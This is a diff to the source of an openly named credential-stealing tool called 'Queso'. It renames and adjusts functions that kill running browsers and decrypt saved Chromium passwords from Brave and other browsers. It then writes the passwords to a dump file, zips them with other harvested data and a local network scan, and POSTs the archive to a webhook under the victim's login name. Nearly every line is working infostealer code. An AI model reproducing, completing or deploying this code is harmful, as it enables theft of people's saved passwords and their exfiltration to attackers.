@@ -279,7 +279,7 @@ class Browsers:
             else:
                 return str(Syscalls.CryptUnprotectData(buffer))
             
-        def GetCredentials(self):
+        def GetCreds(self):
             encryption_key = self.GetEncryptionKey()
             password_list = list()
 
@@ -380,7 +380,7 @@ class Queso:
             subprocess.Popen("{}".format(boundExePath))
 
     @Errors.Catch
-    def StealBrowserCredentials(self):
+    def StealBrowserCreds(self):
         browser_threads: list[Thread] = []
         browser_paths = {
             "Brave" : (os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"), "brave"),
@@ -405,14 +405,18 @@ class Queso:
                     try:
                         Utility.KillTask(process_name)
                         browser_instance = Browsers.Chromium(d_path)
-                        password_file_path = os.path.join(sys._MEIPASS, "dumped_credentials.txt")
+                        password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")
 
-                        browser_passwords = browser_instance.GetPasswords()
+                        browser_passwords = browser_instance.GetCreds()
 
                         if browser_passwords:
                             passwords_out = ["{},{},{}\n".format(*password_data) for password_data in browser_passwords]
-                            with open(password_file_path, "w") as password_file:
-                                password_file.write("".join(passwords_out))
+                            if not os.path.exists(password_file_path):
+                                with open(password_file_path, "w") as password_file:
+                                    password_file.write("".join(passwords_out))
+                            else:
+                                with open(password_file_path, "a") as password_file:
+                                    password_file.write("".join(passwords_out))
                     
                     except Exception:
                         pass
@@ -507,17 +511,18 @@ class Queso:
                 zip_data['xml']['localnetwork'] = network_scan
         
         if "%steal_credentials%":
-            self.StealBrowserCredentials()
-            password_file_path = os.path.join(sys._MEIPASS, "dumped_credentials.txt")
-            if os.path.isfile(password_file_path):
+            self.StealBrowserCreds()
+            password_file_path = os.path.join(sys._MEIPASS, "dumped_creds.txt")
+            if os.path.exists(password_file_path):
                 with open(password_file_path, "r") as password_file:
-                    zip_data['txt']['dumped_credentials'] = password_file.read()
+                    zip_data['txt']['dumped_creds'] = password_file.read()
 
         # Try to create a zip file and attach it if we can
         Utility.CreateZip(zip_data)
         if os.path.exists(os.path.join(sys._MEIPASS, "data.zip")):
             with open(os.path.join(sys._MEIPASS, "data.zip"), "rb") as zip_file:
                 webhook_fields['file'] = (f"{os.getlogin()}.zip", zip_file.read())
+
 
         webhook_fields['payload_json'] = json.dumps(webhook_payload).encode() # Append the embed
         http_manager.request("POST", self.Webhook, fields= webhook_fields) # Bon voyage!
